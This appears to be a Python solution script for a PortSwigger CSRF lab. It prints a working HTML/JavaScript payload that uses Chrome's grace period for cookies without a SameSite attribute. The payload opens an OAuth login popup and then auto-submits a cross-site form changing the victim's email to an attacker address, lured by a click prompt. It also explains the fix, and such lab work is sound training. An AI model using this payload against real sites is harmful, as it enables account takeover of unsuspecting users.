# Lab 10 — SameSite Lax bypass via cookie refresh
# PortSwigger: https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-cookie-refresh
#
# Vulnerability: Session cookie issued without SameSite attribute via OAuth flow
#                Chrome's 2-minute Lax grace period applies to newly-issued cookies
# Aim:           Force a cookie refresh during the attack to exploit the grace period
#
# Technique:
#   Chrome applies Lax-by-default to cookies without an explicit SameSite value.
#   BUT there's a 2-minute grace period after a cookie is FIRST SET during which
#   it behaves as SameSite=None (no restriction at all).
#   This exists so OAuth flows work — the fresh session cookie needs to be usable
#   cross-site immediately after the OAuth redirect sets it.
#
#   Attack:
#     1. Victim clicks anywhere on the exploit page (needed for popup to open)
#     2. Popup opens /social-login → OAuth flow → fresh session cookie issued
#     3. Script waits 5 seconds (cookie is brand new → grace period active)
#     4. Script submits CSRF form → POST carries the new cookie (no SameSite restriction yet)
#     5. Email changed
#
#   📝 The grace period ONLY applies to cookies with no SameSite set at all.
#      Explicitly setting SameSite=Lax removes the grace period entirely.
#      This is the fix: always explicitly set your SameSite attribute.
#
#   ⚠  This lab cannot be verified automatically — the grace period and popup
#      require a real browser. Script prints the exploit only.
#
# Usage: python csrf_lab10.py <url>

import sys
import urllib3
from csrf_utils import banner, section, print_box, print_exploit_steps

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

VICTIM_EMAIL = "attacker@evil.com"

if __name__ == "__main__":
    banner()
    section("LAB 10 — CSRF: SameSite LAX BYPASS VIA COOKIE REFRESH (2-MIN GRACE)")

    if len(sys.argv) != 2:
        print("  Usage: python csrf_lab10.py <url>")
        sys.exit(1)

    url = sys.argv[1]

    print("\n  ℹ  Chrome applies a 2-minute grace period to cookies issued")
    print("     without an explicit SameSite attribute. During this window,")
    print("     the cookie behaves as SameSite=None (no restriction).\n")
    print("  ➜  The exploit:")
    print("     1. Forces a cookie refresh via the OAuth /social-login flow (popup)")
    print("     2. Waits 5 seconds (fresh cookie → grace period active)")
    print("     3. Submits the CSRF form → cookie is sent cross-site\n")

    exploit = f"""\
<script>
    // Victim must click for popup blocker to allow the window.open()
    window.onclick = () => {{
        // Open the OAuth login flow in a popup → fresh session cookie issued
        window.open('{url}/social-login');
        // Wait 5 seconds then fire the CSRF form (grace period still active)
        setTimeout(submitForm, 5000);
    }}

    function submitForm() {{
        var form     = document.createElement('form');
        var email    = document.createElement('input');
        form.method  = 'POST';
        form.action  = '{url}/my-account/change-email';
        email.name   = 'email';
        email.value  = '{VICTIM_EMAIL}';
        form.appendChild(email);
        document.body.appendChild(form);
        form.submit();
    }}
</script>
<p>Click anywhere to continue</p>"""

    print_box("EXPLOIT SERVER BODY", exploit)
    print_exploit_steps()
    print()
    print("  ➜  The victim must click once (to allow the popup).")
    print("     This is unavoidable — browsers block popups from pages the")
    print("     user hasn't interacted with. One click is still a realistic")
    print("     social engineering scenario (e.g. 'Click to claim your prize').")
    print()
    print("  ℹ  Fix: add SameSite=Lax explicitly to the session cookie.")
    print("     Explicit Lax has no grace period — the bypass doesn't work.")
